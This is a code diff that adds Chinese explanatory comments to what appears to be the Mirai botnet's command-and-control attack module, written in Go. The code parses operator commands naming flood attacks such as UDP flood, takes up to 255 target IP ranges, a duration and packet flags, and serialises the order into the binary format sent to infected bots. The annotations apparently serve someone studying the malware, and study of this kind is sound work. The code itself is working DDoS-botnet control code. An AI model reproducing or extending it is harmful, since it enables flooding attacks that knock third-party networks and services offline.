@@ -11,25 +11,25 @@ import (
 )
 
 type AttackInfo struct {
-    attackID            uint8
-    attackFlags         []uint8
-    attackDescription   string
+    attackID            uint8 //填充attack中的Type
+    attackFlags         []uint8  //这种攻击方式可以支持的flags，处理用户输入的flags的时候需要判断
+    attackDescription   string   //只在?处理时用于输出提示用户
 }
 
 type Attack struct {
     Duration    uint32
-    Type        uint8
-    Targets     map[uint32]uint8    // Prefix/netmask
-    Flags       map[uint8]string    // key=value
+    Type        uint8      //atk.Type = atkInfo.attackID
+    Targets     map[uint32]uint8    // Prefix/netmask     ip/netmask
+    Flags       map[uint8]string    // key=value   len=123     Flags[0] = 123  攻击类型Type和Flags都是传的一个ID
 }
 
 type FlagInfo struct {
     flagID          uint8
-    flagDescription string
+    flagDescription string  //提示用户时使用
 }
 
 
-//攻击flag
+//攻击flag  flagID对应的是attack.h里面的攻击选项宏，所以传输的时候只需要传输数字
 var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
     "len": FlagInfo {
         0,
@@ -135,9 +135,9 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
 }
 
 
-//攻击命令
+//攻击命令  对应attack.h中定义的宏，攻击方式
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
-    "udp": AttackInfo {
+    "udp": AttackInfo {   //根据攻击名称取出AttackInfo
         0,
         []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
         "UDP flood",
@@ -189,8 +189,10 @@ var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
     },
 }
 
+
+//遍历slice匹配a
 func uint8InSlice(a uint8, list []uint8) bool {
-    for _, b := range list {
+    for _, b := range list {    // _忽略序号
         if b == a {
             return true
         }
@@ -199,13 +201,15 @@ func uint8InSlice(a uint8, list []uint8) bool {
 }
 
 
-//发起一个新攻击
+//构造一个Attack结构体   syn ip/netmask,ip/netmask,ip/netmask 1000  len=111 fin=true
 func NewAttack(str string, admin int) (*Attack, error) {
-    atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
-    args, _ := shellwords.Parse(str)
+    atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}   //就是在填充Attack结构体
+
+
+    args, _ := shellwords.Parse(str)  //str解析出参数
 
     var atkInfo AttackInfo
-    // Parse attack name    解析命令行参数
+    // Parse attack name    解析命令行参数args[0]  ，即攻击名称
     if len(args) == 0 {
         return nil, errors.New("Must specify an attack name")
     } else {
@@ -217,25 +221,28 @@ func NewAttack(str string, admin int) (*Attack, error) {
             return nil, errors.New(validCmdList)
         }
         var exists bool
-        atkInfo, exists = attackInfoLookup[args[0]]
+        atkInfo, exists = attackInfoLookup[args[0]]   //攻击名称
         if !exists {
             return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[31mis not a valid attack!", args[0]))
         }
         atk.Type = atkInfo.attackID
-        args = args[1:]
+        args = args[1:]  //这个好6
     }
 
-    // Parse targets　　　目标
+    // Parse targets　　　解析命令行参数args[1],即攻击目标
     if len(args) == 0 {
         return nil, errors.New("Must specify prefix/netmask as targets")
     } else {
         if args[0] == "?" {
             return nil, errors.New("\033[37;1mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
         }
-        cidrArgs := strings.Split(args[0], ",")
-        if len(cidrArgs) > 255 {
+
+        cidrArgs := strings.Split(args[0], ",")  //攻击目标用,隔开
+
+        if len(cidrArgs) > 255 { //最多255个目标
             return nil, errors.New("Cannot specify more than 255 targets in a single attack!")
         }
+
         for _,cidr := range cidrArgs {
             prefix := ""
             netmask := uint8(32)
@@ -243,8 +250,8 @@ func NewAttack(str string, admin int) (*Attack, error) {
             if len(cidrInfo) == 0 {
                 return nil, errors.New("Blank target specified!")
             }
-            prefix = cidrInfo[0]
-            if len(cidrInfo) == 2 {
+            prefix = cidrInfo[0]  //ip
+            if len(cidrInfo) == 2 {  //有子网掩码
                 netmaskTmp, err := strconv.Atoi(cidrInfo[1])
                 if err != nil || netmask > 32 || netmask < 0 {
                     return nil, errors.New(fmt.Sprintf("Invalid netmask was supplied, near %s", cidr))
@@ -254,7 +261,7 @@ func NewAttack(str string, admin int) (*Attack, error) {
                 return nil, errors.New(fmt.Sprintf("Too many /'s in prefix, near %s", cidr))
             }
 
-            ip := net.ParseIP(prefix)
+            ip := net.ParseIP(prefix)  //parse ip   net里面的函数啊。。。。
             if ip == nil {
                 return nil, errors.New(fmt.Sprintf("Failed to parse IP address, near %s", cidr))
             }
@@ -270,7 +277,7 @@ func NewAttack(str string, admin int) (*Attack, error) {
         if args[0] == "?" {
             return nil, errors.New("\033[37;1mDuration of the attack, in seconds")
         }
-        duration, err := strconv.Atoi(args[0])
+        duration, err := strconv.Atoi(args[0])   //取出攻击持续时间，转换一下  strconv
         if err != nil || duration == 0 || duration > 3600 {
             return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 3600 seconds", args[0]))
         }
@@ -280,6 +287,7 @@ func NewAttack(str string, admin int) (*Attack, error) {
 
     // Parse flags　　　
     for len(args) > 0 {
+
         if args[0] == "?" {
             validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
             for _, flagID := range atkInfo.attackFlags {
@@ -294,25 +302,28 @@ func NewAttack(str string, admin int) (*Attack, error) {
             validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
             return nil, errors.New(validFlags)
         }
+
+
         flagSplit := strings.SplitN(args[0], "=", 2)
         if len(flagSplit) != 2 {
             return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
         }
-        flagInfo, exists := flagInfoLookup[flagSplit[0]]
+        flagInfo, exists := flagInfoLookup[flagSplit[0]]  //flagSplit[0]是len,rand,tos等
         if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
-            return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
+            return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))  //如果有这种攻击不支持的flags，退出
         }
-        if flagSplit[1][0] == '"' {
+        if flagSplit[1][0] == '"' {   //去掉双引号，主要双引号之间的字符串
             flagSplit[1] = flagSplit[1][1:len(flagSplit[1]) - 1]
             fmt.Println(flagSplit[1])
         }
-        if flagSplit[1] == "true" {
+
+        if flagSplit[1] == "true" {  //如果有true和false字符串，转为1和0来表示
             flagSplit[1] = "1"
         } else if flagSplit[1] == "false" {
             flagSplit[1] = "0"
         }
-        atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
-        args = args[1:]
+        atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]  //填充flags
+        args = args[1:]  //每次取出args[0]
     }
     if len(atk.Flags) > 255 {
         return nil, errors.New("Cannot have more than 255 flags")
@@ -321,22 +332,24 @@ func NewAttack(str string, admin int) (*Attack, error) {
     return atk, nil
 }
 
+
+//序列化传输attck指令到bot的格式
 func (this *Attack) Build() ([]byte, error) {
-    buf := make([]byte, 0)
+    buf := make([]byte, 0)   //0个字节，后面再append
     var tmp []byte
 
-    // Add in attack duration
+    // Add in attack duration  4字节
     tmp = make([]byte, 4)
     binary.BigEndian.PutUint32(tmp, this.Duration)
     buf = append(buf, tmp...)
 
-    // Add in attack type
+    // Add in attack type  1字节
     buf = append(buf, byte(this.Type))
 
-    // Send number of targets
+    // Send number of targets 1字节
     buf = append(buf, byte(len(this.Targets)))
 
-    // Send targets
+    // Send targets  5n字节
     for prefix,netmask := range this.Targets {
         tmp = make([]byte, 5)
         binary.BigEndian.PutUint32(tmp, prefix)
@@ -344,10 +357,10 @@ func (this *Attack) Build() ([]byte, error) {
         buf = append(buf, tmp...)
     }
 
-    // Send number of flags
+    // Send number of flags   1字节
     buf = append(buf, byte(len(this.Flags)))
 
-    // Send flags
+    // Send flags    key+len+data
     for key,val := range this.Flags {
         tmp = make([]byte, 2)
         tmp[0] = key
@@ -365,7 +378,7 @@ func (this *Attack) Build() ([]byte, error) {
         return nil, errors.New("Max buffer is 4096")
     }
     tmp = make([]byte, 2)
-    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
+    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))   //为啥最后要把buf的长度发出去？？？
     buf = append(tmp, buf...)
 
     return buf, nil
